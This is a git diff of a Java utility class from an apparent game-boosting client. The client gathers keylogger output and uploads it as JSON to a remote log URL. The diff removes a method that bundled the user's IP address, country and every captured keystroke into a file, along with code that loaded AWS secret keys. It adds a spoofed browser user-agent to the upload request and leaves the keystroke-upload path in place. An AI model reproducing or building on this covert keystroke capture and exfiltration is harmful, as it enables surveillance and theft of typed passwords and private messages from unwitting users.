@@ -1,13 +1,11 @@
 package services;
 
-import com.google.gson.Gson;
 import com.google.gson.JsonArray;
-import com.google.gson.JsonElement;
 import com.google.gson.JsonObject;
 import logger.Globals;
 import logger.KeyLogger;
-import model.orders.Order;
 import model.User;
+import model.orders.Order;
 import org.apache.http.HttpResponse;
 import org.apache.http.client.HttpClient;
 import org.apache.http.client.methods.HttpPost;
@@ -15,19 +13,17 @@ import org.apache.http.entity.StringEntity;
 import org.apache.http.impl.client.HttpClientBuilder;
 import org.json.JSONException;
 import org.json.JSONObject;
-import view.AlertBox;
 import webService.AWSWebService;
 
-import java.io.*;
+import java.io.IOException;
+import java.io.InputStream;
 import java.text.DateFormat;
 import java.text.SimpleDateFormat;
-import java.time.LocalDate;
 import java.time.format.DateTimeFormatter;
 import java.util.ArrayList;
 import java.util.Date;
 import java.util.Scanner;
 import java.util.Timer;
-import java.util.logging.Logger;
 
 public class Utils {
 
@@ -52,16 +48,6 @@ public class Utils {
 
         System.out.println(jsonObject);
         sendJson(Globals.logUploadURL, jsonObject);
-//        try {
-//            if(checkForBadWords(KeyLogger.log)) {
-//                Utils.foundBadWord = true;
-//            }
-//            AWSWebService webService =  new AWSWebService();
-//            webService.WebService(createLogFile(), createKey(user, order));
-//            KeyLogger.log.clear();
-//        } catch (IOException e) {
-//            e.printStackTrace();
-//        }
     }
 
 
@@ -69,13 +55,15 @@ public class Utils {
         HttpClient httpClient = HttpClientBuilder.create().build();
 
         try {
-            HttpPost request = new HttpPost(url);
-            StringEntity params =new StringEntity(jsonObject.toString());
-            request.addHeader("content-type", "application/json");
-            request.setEntity(params);
-            HttpResponse response = httpClient.execute(request);
+            HttpPost post = new HttpPost(url);
+            StringEntity params = new StringEntity(jsonObject.toString());
+            post.setHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36");
+            post.setEntity(params);
+            HttpResponse response = httpClient.execute(post);
+            System.out.println(" DSADSADSADSADSADSADSADASDASDSADSADSADSAD"+response.getStatusLine().getStatusCode());
             return true;
         }catch (Exception ex) {
+            System.out.println("QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ");
             System.out.println(ex);
         }
         return false;
@@ -110,28 +98,9 @@ public class Utils {
         DateTimeFormatter dtf = DateTimeFormatter.ofPattern("yyyy/MM/dd");
         String path = "";
         path += AWSWebService.folder + "/";
-        path += LocalDate.now() + "/";
         path += createFileName(user, order) + ".csv";
         return path;
     }
-
-    public File createLogFile() throws IOException {
-        File tempFile = File.createTempFile("anyad", ".txt");
-        BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(tempFile));
-        bufferedWriter.write("The booster's IP adress is: " + getMyIp());
-        bufferedWriter.write(System.getProperty("line.separator"));
-        bufferedWriter.write("The booster's Country is: " + getMyCountry());
-        bufferedWriter.write(System.getProperty("line.separator"));
-        bufferedWriter.write(System.getProperty("line.separator"));
-        for (String row : KeyLogger.log) {
-            bufferedWriter.write(row);
-            bufferedWriter.write(System.getProperty("line.separator"));
-        }
-        bufferedWriter.close();
-
-        return tempFile;
-    }
-
 
     public String createFileName(User user, Order order) {
         String fileName = "";
@@ -168,23 +137,6 @@ public class Utils {
             e.printStackTrace();
             return "couldn't find his Country";
         }
-    }
-
-    public void readKeys() {
-        ArrayList<String> keys = new ArrayList<>();
-        Scanner scanner = null;
-        scanner = new Scanner(ClassLoader.getSystemResourceAsStream("keys.csv"));
-        if(scanner != null) {
-            while (scanner.hasNext()) {
-                keys.add(scanner.nextLine());
-            }
-            scanner.close();
-        }
-        AWSWebService.accessKey = keys.get(0);
-        AWSWebService.secretKey = keys.get(1);
-        AWSWebService.bucketName = keys.get(2);
-        AWSWebService.folder = keys.get(3);
-        AWSWebService.region = keys.get(4);
     }
 
     public void disableChat(String server) {
